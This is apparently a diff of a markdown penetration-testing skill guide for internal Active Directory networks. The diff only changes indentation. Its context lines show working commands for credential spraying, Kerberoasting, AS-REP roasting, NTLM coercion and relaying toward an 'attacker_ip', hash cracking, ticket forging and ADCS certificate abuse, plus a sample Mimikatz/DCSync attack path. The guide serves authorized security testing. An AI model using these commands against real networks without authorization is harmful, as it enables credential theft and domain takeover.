@@ -1,8 +1,8 @@
 ---
 name: conducting-internal-network-penetration-test
 description: Execute an internal network penetration test simulating an insider threat
-  or post-breach attacker to identify lateral movement paths, privilege escalation
-  vectors, and sensitive data exposure within the corporate network.
+ or post-breach attacker to identify lateral movement paths, privilege escalation
+ vectors, and sensitive data exposure within the corporate network.
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -101,7 +101,7 @@ netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups
 
 # LDAP enumeration
 ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
-  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
+ -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
 
 # Enumerate Group Policy Objects
 netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
@@ -154,7 +154,7 @@ impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
 
 # PetitPotam — coerce NTLM authentication
 python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
-  attacker_ip 10.0.0.5
+ attacker_ip 10.0.0.5
 ```
 
 ### Password Attacks
@@ -162,7 +162,7 @@ python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
 ```bash
 # Crack captured NTLMv2 hashes
 hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule
+ -r /usr/share/hashcat/rules/best64.rule
 
 # Password spraying (careful with lockout policies)
 netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
@@ -170,12 +170,12 @@ netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce
 
 # Kerberoasting — target service accounts
 impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
-  -outputfile kerberoast_hashes.txt
+ -outputfile kerberoast_hashes.txt
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 
 # AS-REP Roasting — target accounts without pre-auth
 impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
-  -outputfile asrep_hashes.txt
+ -outputfile asrep_hashes.txt
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -237,12 +237,12 @@ impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.lo
 
 # Silver Ticket attack
 impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
-  -domain corp.local -spn MSSQL/db01.corp.local administrator
+ -domain corp.local -spn MSSQL/db01.corp.local administrator
 
 # ADCS exploitation (Certifried, ESC1-ESC8)
 certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
 certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
-  -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
+ -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
 ```
 
 ## Phase 4 — Data Access and Impact Demonstration
@@ -272,12 +272,12 @@ echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt
 
 ```
 Attack Path 1: Domain Compromise via LLMNR Poisoning
-  Step 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
-  Step 2: Hash cracked offline — user: jsmith, password: Welcome2025!
-  Step 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
-  Step 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
-  Step 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
-  Impact: Complete domain compromise from unauthenticated network position
+ Step 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
+ Step 2: Hash cracked offline — user: jsmith, password: Welcome2025!
+ Step 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
+ Step 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
+ Step 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
+ Impact: Complete domain compromise from unauthenticated network position
 ```
 
 ### Findings Severity Matrix
